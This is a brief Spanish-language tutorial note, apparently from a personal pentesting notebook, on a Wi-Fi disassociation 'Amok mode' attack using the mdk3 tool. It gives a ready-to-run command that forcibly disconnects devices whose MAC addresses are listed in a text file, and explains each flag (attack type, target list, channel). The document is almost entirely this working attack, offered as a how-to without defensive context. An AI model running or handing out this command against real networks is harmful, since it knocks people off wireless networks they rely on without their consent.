# Dissasociation Amok Mode Attack Con MDK3
Este ataque lo que hace es expulsar a los usuarios que se encuentran en la red.

Para esto vamos a generar una lista negra de los usuarios que deseamos expulsar, guardamos las direcciones macs de los dispositivos en un txt.

	mdk3 wlan1mon d -w blackList.txt -c 6

- d *hace referencia el tipo de ataque*
- -w blackList.txt *el nombre del archivo donde se encuentras las direcciones macs*
- -c 6 *el canal donde se encuentra el AC*

